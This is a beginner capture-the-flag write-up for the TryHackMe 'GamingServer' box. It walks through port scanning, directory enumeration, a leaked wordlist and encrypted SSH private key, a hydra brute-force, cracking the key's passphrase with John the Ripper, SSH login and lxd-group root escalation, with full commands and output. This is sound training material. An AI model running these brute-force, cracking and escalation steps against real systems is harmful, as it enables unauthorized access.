---
title: "TryHackMe - GamingServer"
categories:
  - Writeup
tags:
  - linux
  - writeup
  - tryhackme
  - hacking
  - boot2root
---
An Easy Boot2Root box for beginners

## Scanning
Running `rustscan` to scan all ports and with `aggressive` mode from nmap.
```bash
$ rustscan -a 10.10.213.104 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.213.104:22
Open 10.10.213.104:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 05:07 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:07
Completed NSE at 05:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:07
Completed NSE at 05:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:07
Completed NSE at 05:07, 0.00s elapsed
Initiating Ping Scan at 05:07
Scanning 10.10.213.104 [2 ports]
Completed Ping Scan at 05:07, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:07
Completed Parallel DNS resolution of 1 host. at 05:07, 13.01s elapsed
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 05:07
Scanning 10.10.213.104 [2 ports]
Discovered open port 80/tcp on 10.10.213.104
Discovered open port 22/tcp on 10.10.213.104
Completed Connect Scan at 05:07, 0.19s elapsed (2 total ports)
Initiating Service scan at 05:08
Scanning 2 services on 10.10.213.104
Completed Service scan at 05:08, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.213.104.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:08
Completed NSE at 05:08, 5.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:08
Completed NSE at 05:08, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:08
Completed NSE at 05:08, 0.00s elapsed
Nmap scan report for 10.10.213.104
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-01-13 05:07:46 EST for 26s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There's only 2 ports open, SSH and HTTP.

## Enumeration
Let's visit the port 80 first.

<a href="/assets/images/tryhackme/gamingserver/1.png"><img src="/assets/images/tryhackme/gamingserver/1.png"></a>

A gaming server as the room's title. Let's run `gobuster` first.
```bash
$ gobuster dir -u http://10.10.213.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.213.104
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,jpg,html,css,jpeg,txt
[+] Timeout:        10s
===============================================================
2021/01/13 05:11:34 Starting gobuster
===============================================================
/about.php (Status: 200)
/about.html (Status: 200)
/index.html (Status: 200)
/video.jpg (Status: 200)
/uploads (Status: 301)
/style.css (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/myths.html (Status: 200)
```

Let's check `/robot.txt` file first. 

<a href="/assets/images/tryhackme/gamingserver/2.png"><img src="/assets/images/tryhackme/gamingserver/2.png"></a>

`/uploads` directory, let's check it out.

<a href="/assets/images/tryhackme/gamingserver/3.png"><img src="/assets/images/tryhackme/gamingserver/3.png"></a>

Couple of files, here is the conttent of each file:
- dict.lst
    ```
    Spring2017
    Spring2016
    Spring2015
    Spring2014
    Spring2013
    spring2017
    spring2016
    spring2015
    spring2014
    spring2013
    Summer2017
    Summer2016
    Summer2015
    Summer2014
    Summer2013
    summer2017
    summer2016
    summer2015
    summer2014
    summer2013
    Autumn2017
    Autumn2016
    Autumn2015
    Autumn2014
    Autumn2013
    autumn2017
    autumn2016
    autumn2015
    autumn2014
    autumn2013
    Winter2017
    Winter2016
    Winter2015
    Winter2014
    Winter2013
    winter2017
    winter2016
    winter2015
    winter2014
    winter2013
    P@55w0rd
    P@ssw0rd!
    P@55w0rd!
    sqlsqlsqlsql
    SQLSQLSQLSQL
    Welcome123
    Welcome1234
    Welcome1212
    PassSql12
    network
    networking
    networks
    test
    testtest
    testing
    testing123
    testsql
    test-sql3
    sqlsqlsqlsqlsql
    bankbank
    default
    test
    testing
    password2

    password
    Password1
    Password1!
    P@ssw0rd
    password12
    Password12
    security
    security1
    security3
    secuirty3
    complex1
    complex2
    complex3
    sqlserver
    sql
    sqlsql
    password1
    password123
    complexpassword
    database
    server
    changeme
    change
    sqlserver2000
    sqlserver2005
    Sqlserver
    SqlServer
    Password1
    Password2
    P@ssw0rd
    P@ssw0rd!
    P@55w0rd!
    P@ssword!
    Password!
    password!
    sqlsvr
    sqlaccount
    account
    sasa
    sa
    administator
    pass
    sql
    microsoft
    sqlserver
    sa
    hugs
    sasa
    welcome
    welcome1
    welcome2
    march2011
    sqlpass
    sqlpassword
    guessme
    bird
    P@55w0rd!
    test
    dev
    devdev
    devdevdev
    qa
    god
    admin
    adminadmin
    admins
    goat
    sysadmin
    water
    dirt
    air
    earth
    company
    company1
    company123
    company1!
    company!
    secret
    secret!
    secret123
    secret1212
    secret12
    secret1!
    sqlpass123
    Summer2013
    Summer2012
    Summer2011
    Summer2010
    Summer2009
    Summer2008
    Winter2013
    Winter2012
    Winter2011
    Winter2010
    Winter2009
    Winter2008
    summer2013
    summer2012
    summer2011
    summer2010
    summer2009
    summer2008
    winter2013
    winter2012
    winter2011
    winter2010
    winter2009
    winter2008
    123456
    abcd123
    abc
    burp
    private
    unknown
    wicked
    alpine
    trust
    microsoft
    sql2000
    sql2003
    sql2005
    sql2008
    vista
    xp
    nt
    98
    95
    2003
    2008
    someday
    sql2010
    sql2011
    sql2009
    complex
    goat
    changelater
    rain
    fire
    snow
    unchanged
    qwerty
    12345678
    football
    baseball
    basketball
    abc123
    111111
    1qaz2wsx
    dragon
    master
    monkey
    letmein
    login
    princess
    solo
    qwertyuiop
    starwars
    ```
- manifesto.txt
    ```
                The Hacker Manifesto

                        by
                    +++The Mentor+++
                Written January 8, 1986

    Another one got caught today, it's all over the papers. "Teenager Arrested in Computer Crime 
    Scandal", "Hacker Arrested after Bank Tampering"...

    Damn kids. They're all alike.

    But did you, in your three-piece psychology and 1950's technobrain, ever take a look behind 
    the eyes of the hacker? Did you ever wonder what made him tick, what forces shaped him, 
    what may have molded him?

    I am a hacker, enter my world...

    Mine is a world that begins with school... I'm smarter than most of the other kids, this crap 
    they teach us bores me...

    Damn underachiever. They're all alike.

    I'm in junior high or high school. I've listened to teachers explain for the fifteenth time 
    how to reduce a fraction. I understand it. "No, Ms. Smith, I didn't show my work. I did it 
    in my head..."

    Damn kid. Probably copied it. They're all alike.

    I made a discovery today. I found a computer. Wait a second, this is cool. It does what I 
    want it to. If it makes a mistake, it's because I screwed it up. Not because it doesn't like 
    me... Or feels threatened by me.. Or thinks I'm a smart ass.. Or doesn't like teaching and 
    shouldn't be here...

    Damn kid. All he does is play games. They're all alike.

    And then it happened... a door opened to a world... rushing through the phone line like heroin
    through an addict's veins, an electronic pulse is sent out, a refuge from the day-to-day 
    incompetencies is sought... a board is found. "This is it... this is where I belong..." I know
    everyone here... even if I've never met them, never talked to them, may never hear from them 
    again... I know you all...

    Damn kid. Tying up the phone line again. They're all alike...

    You bet your ass we're all alike... we've been spoon-fed baby food at school when we hungered 
    for steak... the bits of meat that you did let slip through were pre-chewed and tasteless. 
    We've been dominated by sadists, or ignored by the apathetic. The few that had something to 
    teach found us willing pupils, but those few are like drops of water in the desert.

    This is our world now... the world of the electron and the switch, the beauty of the baud. We 
    make use of a service already existing without paying for what could be dirt-cheap if it 
    wasn't run by profiteering gluttons, and you call us criminals. We explore... and you call us 
    criminals. We seek after knowledge... and you call us criminals. We exist without skin color, 
    without nationality, without religious bias... and you call us criminals. You build atomic 
    bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe it's for 
    our own good, yet we're the criminals.

    Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by 
    what they say and think, not what they look like. My crime is that of outsmarting you, 
    something that you will never forgive me for.

    I am a hacker, and this is my manifesto. You may stop this individual, but you can't stop us 
    all... after all, we're all alike.
    ```
- meme.jpg

    <a href="/assets/images/tryhackme/gamingserver/4.png"><img src="/assets/images/tryhackme/gamingserver/4.png"></a>

The `dict.lst` file probably the password for something. Let's go to `/secret` directory.

<a href="/assets/images/tryhackme/gamingserver/5.png"><img src="/assets/images/tryhackme/gamingserver/5.png"></a>
- secretKey:
    ```
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

    T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
    H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
    FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
    Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
    9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
    IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
    SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
    /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
    w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
    6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
    Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
    xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
    8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
    b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
    vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
    wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
    rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
    RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
    oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
    cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
    99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
    Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
    Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
    v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
    gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
    -----END RSA PRIVATE KEY-----
    ```

Woo! private key, it's for SSH. We just need to find the username to SSH into the machine. I found the username is `john` by looking to the source-code of the `index.html`.

<a href="/assets/images/tryhackme/gamingserver/6.png"><img src="/assets/images/tryhackme/gamingserver/6.png"></a>

Let's bruteforce john's password using the `dict.list` we found earlier.
```bash
$ hydra -l john -P list.txt 10.10.213.104 -t 4 ssh 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-13 05:28:16
[DATA] max 4 tasks per 1 server, overall 4 tasks, 222 login tries (l:1/p:222), ~56 tries per task
[DATA] attacking ssh://10.10.213.104:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 178 to do in 00:05h, 4 active
[STATUS] 28.33 tries/min, 85 tries in 00:03h, 137 to do in 00:05h, 4 active
[STATUS] 31.00 tries/min, 124 tries in 00:04h, 98 to do in 00:04h, 4 active
[STATUS] 28.80 tries/min, 144 tries in 00:05h, 78 to do in 00:03h, 4 active
[STATUS] 28.17 tries/min, 169 tries in 00:06h, 53 to do in 00:02h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 18 to do in 00:01h, 4 active
[STATUS] 27.75 tries/min, 222 tries in 00:08h, 1 to do in 00:01h, 2 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-13 05:36:31
```

It didn't work. Since we found the private key, let's dehashed it and SSH with it.
```bash
$ locate ssh2john                      
/usr/share/john/ssh2john.py
$ python /usr/share/john/ssh2john.py   
$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash                                             130 ⨯
$ john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:02 DONE (2021-01-13 05:26) 0.3984g/s 5713Kp/s 5713Kc/s 5713KC/s     1990..*7¡Vamos!
Session completed
```

SSH!
```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa john@10.10.213.104
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 13 11:13:06 UTC 2021

  System load:  0.0               Processes:           148
  Usage of /:   42.0% of 9.78GB   Users logged in:     0
  Memory usage: 38%               IP address for eth0: 10.10.213.104
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```

User.txt:
```bash
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt 
REDACTED
```

## Escalation
I tried basic privesc check and found nothing. After that i check the group of john and it's in `lxd` group.
```bash
john@exploitable:/tmp$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We can privesc with `lxd` group. Follow [this tutorial](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) and we got root!
```bash
john@exploitable:/tmp$ lxc exec privesc /bin/sh
~ # whoami
root
```

root.txt:
```bash
/ # find -type f -name root.txt 2>/dev/null
./mnt/root/root/root.txt
/ # cat /mnt/root/root/root.txt
REDACTED
```